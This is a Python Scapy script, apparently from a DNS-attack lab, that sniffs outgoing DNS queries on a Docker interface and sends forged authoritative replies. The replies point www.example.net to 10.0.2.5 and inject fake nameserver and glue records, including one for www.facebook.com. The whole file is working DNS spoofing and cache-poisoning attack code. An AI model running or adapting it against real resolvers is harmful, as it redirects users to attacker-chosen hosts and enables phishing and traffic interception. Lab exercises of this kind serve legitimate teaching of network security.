#!/usr/bin/python2
from scapy.all import *

local_dns_srv = '172.17.0.3'

def spoof_dns(pkt):
	if (DNS in pkt and 'www.example.net' in str(pkt[DNS].qd.qname)):
		# old(request) packet: src-local DNS server, dst-global DNS servers
		# response packet src-global DNS server, dst-local DNS server

		# swap the source and destination IP address
		IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)

		# swap the src and dst port number
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

		# the answer section
		# let the response of query domain name(www.example.net) be 10.0.2.5
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
			ttl=259200, rdata='10.0.2.5')

		# the authority section
		# add 2 nameserver resource records
		NSsec1 = DNSRR(rrname='example.net', type='NS',
			ttl=259200, rdata='ns1.example.net')
		NSsec2 = DNSRR(rrname='example.net', type='NS',
			ttl=259200, rdata='ns2.example.net')

		# the additional section
		Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
			ttl=259200, rdata='1.2.3.4')
		Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
			ttl=259200, rdata='3.4.5.6')
		Addsec3 = DNSRR(rrname='www.facebook.com', type='A',
			ttl=259200, rdata='5.6.7.8')

		# construct the DNS response packet
		# let DNS id and question record in response packet
		#be the same as request packet
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
			qdcount=1, ancount=1, nscount=2, arcount=2,
			an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3)

		# construct the entire IP packet and send it out
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)

f='udp and (src host {} and dst port 53)'.format(local_dns_srv)
# sniff UDP qurey packets and invoke spoof_dns()
sniff(filter=f, prn=spoof_dns,iface='docker0')

